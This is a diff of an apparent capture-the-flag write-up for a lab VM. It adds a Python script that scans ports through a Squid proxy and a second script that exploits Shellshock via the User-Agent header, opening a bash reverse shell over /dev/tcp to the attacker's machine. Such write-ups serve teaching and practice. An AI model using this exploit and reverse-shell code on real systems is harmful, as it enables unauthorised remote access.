@@ -105,7 +105,42 @@ gobuster dir -u http://192.168.1.38 --proxy http://192.168.1.38:3128 -w /usr/sha
 
 You can enumerate the internal port with an script in Python, this is in [Enumeration and exploiting SQUID Proxies](../../OWASP%20TOP%2010%20and%20web%20vulnerabilities/Enumeration%20and%20exploiting%20SQUID%20Proxies/Enumeration%20and%20exploiting%20SQUID%20Proxies.md)
 
+````python
+#!/usr/bin/python3
 
+import sys, signal, requests
+
+# Global variables
+
+main_url = "http://127.0.0.1"
+squid_proxy = {'http': 'http://192.168.1.38:3128'}
+
+# Ctrl_c
+
+def def_handler(sig, frame):
+    print("\n\n[!] Saliendo...\n")
+    sys.exit(1)
+
+
+signal.signal(signal.SIGINT, def_handler)
+
+def portDiscovery():
+    common_tcp_ports = {20, 21, 22, 23, 25, 53, 80, 110, 115, 119, 135, 137, 138, 139, 143, 161, 194, 389, 443, 445,
+                   465, 514, 515, 587, 636, 993, 995, 1080, 1433, 1434, 1521, 1723, 2049, 2082, 2083, 2086, 2087,
+                   2095, 2096, 3306, 3389, 5432, 5500, 5800, 5900, 6000, 6660, 6661, 6662, 6663, 6664, 6665, 6666, 6667, 6668, 6669}
+    
+    for tcp_port in common_tcp_ports:
+        
+        r = requests.get(main_url + ':' + str(tcp_port), proxies=squid_proxy)
+
+        if r.status_code != 503:
+
+            print("[+] Open Port: " + str(tcp_port))
+
+if __name__ == '__main__':
+    portDiscovery()
+
+````
 
 ![](../../Images/Pasted%20image%2020230831183405.png)
 
@@ -213,7 +248,53 @@ And nice!! We gain access to the machine
 
 ![](../../Images/Pasted%20image%2020230901144013.png)
 
+---
 
+## Python scripting
+
+We can automate this, we can reuse the python script from squid proxy 
+
+````python
+#!/usr/bin/python3
+
+import sys, signal, requests, threading
+from pwn import *
+
+# Global variables
+
+main_url = "http://127.0.0.1/cgi-bin/status"
+squid_proxy = {'http': 'http://192.168.1.38:3128'}
+lport=443
+
+# Ctrl_c
+
+def def_handler(sig, frame):
+    print("\n\n[!] Saliendo...\n")
+    sys.exit(1)
+
+
+signal.signal(signal.SIGINT, def_handler)
+
+def shellShock_attack():
+    headers = {'User-Agent': "() { :; }; /bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.1.39/443 0>&1'"}
+
+    r = requests.get(main_url, headers=headers, proxies=squid_proxy)
+
+if __name__ == '__main__':
+    try:
+        threading.Thread(target=shellShock_attack, args=()).start() # Executing in background
+    except Exception as e:
+        log.error(str(e))
+
+    shell = listen(lport, timeout=20).wait_for_connection()
+
+    if shell.sock is None:
+        log.failure("A connection could not be established")
+        sys.exit(1)
+    else:
+        shell.interactive()
+
+````
 
 ---
 
